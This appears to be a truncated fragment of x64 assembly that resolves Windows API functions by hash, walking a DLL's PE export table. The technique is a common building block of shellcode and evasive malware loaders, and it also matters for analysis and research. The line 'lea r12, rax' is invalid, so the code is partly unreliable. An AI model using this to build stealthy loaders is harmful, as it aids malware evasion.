LoadLibraryAConst equ 74776072h
GetProcAddressConst equ 0E553E06Fh
ExitProcessConst equ 0C3F39F16h

.code
align 16

GetAPIs proc
    ; rsi - DLL imagebase
    ; rdi - API array 

    push rbx
    push r12
    push r13
    push r14
    push r15

    mov rbx, rsi
    mov eax, dword ptr [rbx + 3Ch]      ; PE Header MZ
    lea rsi, [rbx + rax]

    mov eax, dword ptr [rsi + 88h]      ; Export Directory
    lea rsi, [rbx + rax]

    mov eax, dword ptr [rsi + 1Ch]
    lea r13, [rbx + rax]                ; AddressOfFunctions

    mov eax, dword ptr [rsi + 24h]      
    lea r14, [rbx + rax]                ; AddressOfNameOrdinals

    mov eax, dword ptr [rsi + 20h]      
    lea r15, [rbx + rax]                ; AddressOfNames

    mov eax, dword ptr [rsi + 18h]      
    lea r12, rax                        ; NumberOfNames

    xor ecx, ecx
    xor r10d, r10d

SearchLoop:
    cmp rcx, r12
    jge Done
